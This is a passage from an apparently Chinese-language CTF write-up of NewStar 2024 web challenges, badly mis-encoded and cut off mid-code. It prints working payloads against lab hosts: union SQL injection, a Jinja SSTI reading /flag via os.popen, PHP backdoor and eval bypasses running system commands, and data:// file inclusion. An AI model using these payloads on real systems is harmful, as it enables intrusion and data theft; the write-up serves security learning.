&#x2F;Ap3xï¼‰</p><p>ç¬¬å››å…³ï¼šå‰ç«¯jsé™åˆ¶äº†è¡¨å•çš„é»˜è®¤æäº¤è¡Œä¸ºï¼Œç›´æ¥é€šè¿‡æ§åˆ¶å°ï¼ˆæˆ–ç¦ç”¨jsï¼‰</p><blockquote><p>fetch(â€œ&#x2F;api&#x2F;flag&#x2F;Ap3xâ€, {<br>    method: â€œPOSTâ€,<br>    headers: {<br>        â€œContent-Typeâ€: â€œapplication&#x2F;x-www-form-urlencodedâ€<br>    },<br>    body: â€œcsrf_token&#x3D;hfaousghashgfasbasiouwrda1_â€<br>}).then(r &#x3D;&gt; r.text()).then(console.log);</p></blockquote><p>ï¼ˆ{â€œflagâ€:â€fSkpKcyF9â€,â€nextLevelâ€:null}ï¼‰</p><blockquote><p>å®Œæ•´flagï¼šZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</p><p>base64è§£ç ï¼šflag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</p></blockquote><h3 id="æ™ºæ¢°å±æœº"><a href="#æ™ºæ¢°å±æœº" class="headerlink" title="æ™ºæ¢°å±æœº"></a>æ™ºæ¢°å±æœº</h3><p>robots.txtä¸­å¾—åˆ°&#x2F;backd0or.php</p><p>è®¿é—®å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute_cmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt_request</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-variable">$decoded_key</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$reversed_cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123;<br>        <span class="hljs-variable">$reversed_cmd</span> .= <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-variable">$hashed_reversed_cmd</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$reversed_cmd</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hashed_reversed_cmd</span> !== <span class="hljs-variable">$decoded_key</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid key&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$decrypted_cmd</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decrypted_cmd</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">execute_cmd</span>(<span class="hljs-title function_ invoke__">decrypt_request</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¸€ä¸ªè§£å¯†å‡½æ•°</p><p>è§£å¯†å‡½æ•°å°†ä¼ å…¥çš„keyè§£ç åï¼Œå¯¹ä¼ å…¥çš„cmdè¿›è¡Œåè½¬ï¼Œå¦‚æœåè½¬åçš„cmdçš„md5å€¼ä¸keyè§£ç åçš„å€¼ç›¸ç­‰ï¼Œåˆ™è§£ç cmdå¹¶è¿”å›</p><p>åªéœ€å°†cmdè¿›è¡Œbase64åŠ å¯†ï¼Œå°†åŠ å¯†åçš„å­—ç¬¦ä¸²åè½¬ç„¶åè¿›è¡Œmd5åŠ å¯†ï¼Œå°†åŠ å¯†åçš„å€¼å†æ¬¡è¿›è¡Œbase64åŠ å¯†åèµ‹ç»™keyå³å¯</p><blockquote><p>cmdï¼šcat &#x2F;flag</p><p>base64_cmdï¼šY2F0IC9mbGFn</p><p>reversed_base64_cmdï¼šnFGbm9CI0F2Y</p><p>hashed_reversed_base64_cmdï¼š879a591c6785a4e1398b96a9a1bc67eb</p><p>base64_hashed_reversed_base64_cmdï¼šODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI&#x3D;</p></blockquote><p>ç„¶åpostâ€œcmd&#x3D;Y2F0IC9mbGFn&amp;key&#x3D;ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI&#x3D;â€</p><p><img src="/../images/NewStar2024-web/zxwj.png"></p><h3 id="è°¢è°¢çš®è›‹"><a href="#è°¢è°¢çš®è›‹" class="headerlink" title="è°¢è°¢çš®è›‹"></a>è°¢è°¢çš®è›‹</h3><p>ä¸€ä¸ªç®€å•çš„è”åˆæ³¨å…¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,<span class="hljs-keyword">database</span>()#æŸ¥åº“<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctf&#x27;</span>#æŸ¥è¡¨<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;Fl4g&#x27;</span>#æŸ¥å­—æ®µ<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> des,<span class="hljs-keyword">value</span> <span class="hljs-keyword">from</span> ctf.Fl4g#æ‹¿flag<br></code></pre></td></tr></table></figure><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="PangBaiè¿‡å®¶å®¶ï¼ˆ2ï¼‰"><a href="#PangBaiè¿‡å®¶å®¶ï¼ˆ2ï¼‰" class="headerlink" title="PangBaiè¿‡å®¶å®¶ï¼ˆ2ï¼‰"></a>PangBaiè¿‡å®¶å®¶ï¼ˆ2ï¼‰</h3><p>æ ¹æ®æç¤ºï¼Œç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°å¯ä»¥æ‰«åˆ°.gitç›®å½•</p><p>ç”¨githackerä».gitæ–‡ä»¶å¤¹ä¸­æ³„éœ²æ–‡ä»¶åˆ°æœ¬åœ°</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">githacker</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://192.168.5.40:52701/.git&quot;</span> <span class="hljs-built_in">--output-folder</span> <span class="hljs-string">pangbai2</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥å¯¹åº”æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨git logæŸ¥çœ‹æäº¤å†å²ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå‘ç°</p><p>æŸ¥çœ‹Stashï¼ˆgit stashï¼šä¸´æ—¶ä¿å­˜å·¥ä½œåŒºä¸­æœªæäº¤çš„ä¿®æ”¹ï¼‰</p><p><img src="/../images/NewStar2024-web/pangbai2_1.png"></p><p>å‘ç°åé—¨ï¼Œgit stash popæ¢å¤åé—¨æ–‡ä»¶åˆ°å·¥ä½œåŒº</p><p><img src="/../images/NewStar2024-web/pangbai2_2.png"></p><p>å‘ç°åé—¨æ–‡ä»¶BacKd0or.vubjeVv3GZwDWHK3.phpï¼Œç›´æ¥æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># Functions to handle HTML output</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print_msg</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>) </span>&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\s*&lt;script.*&lt;\/script&gt;/s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/ event/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ç‚¹å‡»æ­¤å¤„è½½å…¥å­˜æ¡£&#x27;</span>, <span class="hljs-variable">$msg</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_backdoor</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/assets/index.4f73d116116831ef.js&#x27;</span>, <span class="hljs-string">&#x27;/assets/backdoor.5b55c904b31db48d.js&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-comment"># Backdoor</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;papa&#x27;</span>] !== <span class="hljs-string">&#x27;doKcdnEOANVB&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">show_backdoor</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai loves you!&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai hates you!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>èƒ½å¦æˆåŠŸè¿›è¡Œrceå…³é”®ç‚¹åœ¨äºç¬¬äºŒä¸ªåˆ¤æ–­ä¸ºçœŸ</p><p>é¦–å…ˆæ˜¯å‚æ•°åNewStar_CTF.2024ä¸­å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœç›´æ¥è¿›è¡Œä¼ å‚phpä¼šé»˜è®¤å°†å…¶è§£æä¸ºNewStar_CTF_2024ï¼Œè¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨â€œ[â€å­—ç¬¦çš„éæ­£ç¡®æ›¿æ¢æ¼æ´</p><blockquote><p>åœ¨php7ä¸­ï¼Œå½“ä¼ å…¥çš„å‚æ•°ä¸­å‡ºç°â€œ[â€ï¼Œä½†æ˜¯æ²¡æœ‰â€]â€æ—¶ï¼Œphpä¼šå°†â€œ[â€è¿™ä¸ªå­—ç¬¦æ›¿æ¢ä¸ºâ€œ_â€ï¼Œä½†æ­¤åå°±ä¸ä¼šç»§ç»­æ›¿æ¢åé¢å‡ºç°çš„ç‰¹æ®Šå­—ç¬¦</p></blockquote><p>å‚æ•°åä¼ NewStar[CTF.2024</p><p>å…¶æ¬¡æ˜¯ä¼ å…¥å‚æ•°å€¼çš„é—®é¢˜ï¼Œä¼ å…¥çš„å€¼æ—¢è¦ä¸ç­‰äºWelcomeï¼Œåˆè¦ç­‰äºWelcomeï¼Œäº†è§£åˆ°</p><blockquote><p>preg_match()è¯¥å‡½æ•°é»˜è®¤ä¸ºå•è¡Œæ¨¡å¼ï¼Œè€Œphpåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œâ€œ$â€é™¤äº†èƒ½å¤ŸåŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œè¿˜èƒ½åŒ¹é…å­—ç¬¦ä¸²æœ€åä¸€ä¸ªæ¢è¡Œç¬¦</p><p>ä½†å¦‚æœåŠ ä¿®é¥°ç¬¦Dï¼Œä¸èƒ½åŒ¹é…æœ€åä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œe.g.preg_match(â€˜&#x2F;^Welcome$&#x2F;Dâ€™, $str)</p></blockquote><p>å‚æ•°å€¼ä¼ Welcome%0a</p><p>è‡³äºcall_user_func()ç¬¬ä¸€ä¸ªä¼ å‘½ä»¤æ‰§è¡Œå‡½æ•°systemï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼ è¦æ‰§è¡Œçš„å‘½ä»¤envï¼ˆæŸ¥çœ‹å½“å‰çš„ç¯å¢ƒå˜é‡ï¼‰</p><p><img src="/../images/NewStar2024-web/pangbai2_3.png"></p><h3 id="ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—"><a href="#ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—" class="headerlink" title="ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—"></a>ä½ èƒ½åœ¨ä¸€ç§’å†…æ‰“å‡ºå…«å¥è‹±æ–‡å—</h3><p>å†™ä¸€ä¸ªpythonè„šæœ¬ï¼Œå»ºç«‹è¿æ¥åè·å–idä¸ºtextçš„pæ ‡ç­¾å†…å®¹ï¼Œç„¶ååœ¨&#x2F;submitè·¯ç”±ä»¥postçš„æ–¹å¼ä½œä¸ºuser_inputæäº¤å¹¶å°†å“åº”æ‰“å°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>session = requests.Session()<br><br>response = session.get(<span class="hljs-string">&quot;http://192.168.5.40:59257/start&quot;</span>)<br>html_content = response.text<br><br>soup = BeautifulSoup(html_content, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>element = soup.find(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;text&#x27;</span>)<br>value = element.get_text()<br><br>submit_response = session.post(<br>    <span class="hljs-string">&quot;http://192.168.5.40:59257/submit&quot;</span>,<br>    data=&#123;<span class="hljs-string">&#x27;user_input&#x27;</span>: value&#125;<br>)<br><br><span class="hljs-built_in">print</span>(submit_response.text)<br></code></pre></td></tr></table></figure><h3 id="å¤è¯»æœº"><a href="#å¤è¯»æœº" class="headerlink" title="å¤è¯»æœº"></a>å¤è¯»æœº</h3><p>ç®€å•çš„ssti</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.os.popen</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="è°¢è°¢çš®è›‹plus"><a href="#è°¢è°¢çš®è›‹plus" class="headerlink" title="è°¢è°¢çš®è›‹plus"></a>è°¢è°¢çš®è›‹plus</h3><h3 id="é—å¤±çš„æ‹‰é“¾"><a href="#é—å¤±çš„æ‹‰é“¾" class="headerlink" title="é—å¤±çš„æ‹‰é“¾"></a>é—å¤±çš„æ‹‰é“¾</h3><p>dirsearchè¿›è¡Œç›®å½•æ‰«æï¼Œå‘ç°<a href="http://www.zip,è®¿é—®ä¸‹è½½åˆ°æœ¬åœ°,è§£å‹å¾—åˆ°pizwww.phpçš„æºç /">www.zipï¼Œè®¿é—®ä¸‹è½½åˆ°æœ¬åœ°ï¼Œè§£å‹å¾—åˆ°pizwww.phpçš„æºç </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//for fun</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&#123;<br>        <span class="hljs-comment">//æ¬¸ ä¸ºå•¥sha1å’Œmd5ç›¸ç­‰å‘¢</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|flag/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;u can not do this &quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong&quot;</span>;<br><br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>é‡‡ç”¨æ•°ç»„ç»•è¿‡ï¼Œsha1ä¸md5çš„å€¼éƒ½ä¸ºnullï¼Œæ»¡è¶³ç›¸ç­‰æ¡ä»¶</p><p><img src="/../images/NewStar2024-web/ysdll.png"></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Include-Me"><a href="#Include-Me" class="headerlink" title="Include Me"></a>Include Me</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&lt;|\?|php|&gt;|echo|filter|flag|system|file|%|&amp;|=|`|eval/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;me&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å…„å¼Ÿä½ åˆ«åŒ…&quot;</span>);<br>    &#125;;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><br><span class="hljs-comment">//å…„å¼Ÿä½ çŸ¥é“äº†å—ï¼Ÿ</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;iknow&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&quot;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">waf</span>();<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;me&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å…„å¼Ÿä½ å¥½é¦™&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¼ å…¥å‚æ•°iknowé˜²è·³è½¬</p><p>å¯ä»¥dataä¼ªåè®®+base64ç›´æ¥æ‰“</p><p><img src="/../images/NewStar2024-web/include1.png"></p><blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœbase64åŠ å¯†åå‡ºç°ç­‰å·ï¼Œåº”è¯¥å°†ç­‰å·åˆ é™¤å› ä¸ºä¼šè¢«wafï¼Œæˆ–åˆ™ä¹Ÿå¯ä»¥é‡‡ç”¨å‘æ˜æ–‡ååŠ 1-2ä¸ªç©ºæ ¼ä½¿åŠ å¯†ç»“æœä¸å¸¦ç­‰å·</p><p>å¦‚æœåŠ å¯†åå­—ç¬¦ç»“å°¾ä¸ºâ€˜+â€™çš„è¯ï¼Œé‚£åº”è¯¥å°†å…¶ç¼–ç ä¸º%2Bï¼Œå› ä¸ºå½“è¡¨å•ä½¿ç”¨application&#x2F;x-www-form-urlencodedç¼–ç æ–¹å¼æ—¶ï¼Œç©ºæ ¼ä¼šç¼–ç ä¸ºâ€˜+â€™ï¼Œé‚£ä¹ˆæµè§ˆå™¨æˆ–æœåŠ¡å™¨ä¼šé»˜è®¤å°†â€˜+â€™è§£æä¸ºç©ºæ ¼ï¼Œè€Œéâ€˜+â€™æœ¬èº«</p></blockquote><h3 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h3><h3 id="è‡­çš®çš„è®¡ç®—æœº"><a href="#è‡­çš®çš„è®¡ç®—æœº" class="headerlink" title="è‡­çš®çš„è®¡ç®—æœº"></a>è‡­çš®çš„è®¡ç®—æœº</h3><p>è¿›å…¥&#x2F;calcè·¯ç”±ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°åç«¯pythonä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> tempfile<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    token = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:<br>            token = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> token<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/calc&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>():<br>    <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        num = request.form.get(<span 